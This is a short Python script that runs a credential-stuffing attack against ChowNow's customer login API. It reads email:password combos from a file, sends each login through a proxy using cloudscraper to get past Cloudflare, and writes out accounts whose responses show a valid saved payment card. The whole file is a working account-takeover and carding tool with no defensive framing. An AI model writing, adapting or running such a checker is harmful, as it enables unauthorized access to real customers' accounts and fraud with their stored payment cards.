import cloudscraper


class Chownow:
    def __init__(self, proxy):
        self.scrape = cloudscraper.create_scraper()
        self.proxy = "http://" + proxy

    def main(self):
        with open("chownow.txt", "r", encoding="utf-8") as f:
            for line in f.readlines():
                username = line.split(":")[0].replace('\n', '')
                password = line.split(":")[1].replace('\n', '')
                req = self.scrape.post("https://api.chownow.com/api/customer/login",
                                       json={"email": f"{username}", "password": f"{password}"},
                                       proxies={"https": self.proxy, "http": self.proxy}, timeout=10)
                
                if "cvv_valid\": true" in req.text:
                    with open("WithCards.txt", "a") as i:
                        i.write(username + ":" + password + "\n")
                        i.close()
                elif "cvv_valid\": false" in req.text:
                    print("Account Have Useless Card")
                elif "cards\": []" in req.text:
                    print("Account With No Card")


Chownow(input("Write ur proxy (Just USA Proxy) like a us.proxy.com:2000 : ")).main()
